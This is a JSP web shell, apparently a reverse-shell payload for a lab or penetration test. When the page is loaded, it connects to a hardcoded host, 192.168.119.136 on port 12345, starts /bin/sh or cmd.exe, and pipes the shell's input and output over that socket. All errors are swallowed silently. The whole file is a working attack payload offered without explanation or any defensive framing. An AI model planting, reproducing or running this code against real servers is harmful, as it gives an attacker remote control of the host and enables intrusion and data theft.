<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xT;
    OutputStream wA;

    StreamConnector( InputStream xT, OutputStream wA )
    {
      this.xT = xT;
      this.wA = wA;
    }

    public void run()
    {
      BufferedReader fE  = null;
      BufferedWriter sBB = null;
      try
      {
        fE  = new BufferedReader( new InputStreamReader( this.xT ) );
        sBB = new BufferedWriter( new OutputStreamWriter( this.wA ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fE.read( buffer, 0, buffer.length ) ) > 0 )
        {
          sBB.write( buffer, 0, length );
          sBB.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fE != null )
          fE.close();
        if( sBB != null )
          sBB.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.136", 12345 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
